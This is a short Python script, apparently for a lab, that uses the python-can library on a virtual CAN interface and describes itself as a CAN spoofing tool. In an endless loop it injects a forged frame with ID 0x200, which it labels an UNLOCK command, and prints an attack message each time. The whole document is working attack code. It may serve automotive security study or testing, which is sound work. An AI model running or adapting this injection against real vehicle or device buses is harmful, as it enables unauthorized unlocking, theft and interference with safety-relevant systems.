import can
import time

bus = can.interface.Bus(
    channel="vcan0",
    interface="socketcan"
)

print("[+] CAN Spoofing Tool Started")

time.sleep(3)

unlock_msg = can.Message(
    arbitration_id=0x200,
    data=bytes([0]),
    is_extended_id=False
)

while True:

    bus.send(unlock_msg)

    print(
        "[ATTACK] Injected UNLOCK command"
    )

    time.sleep(0.5)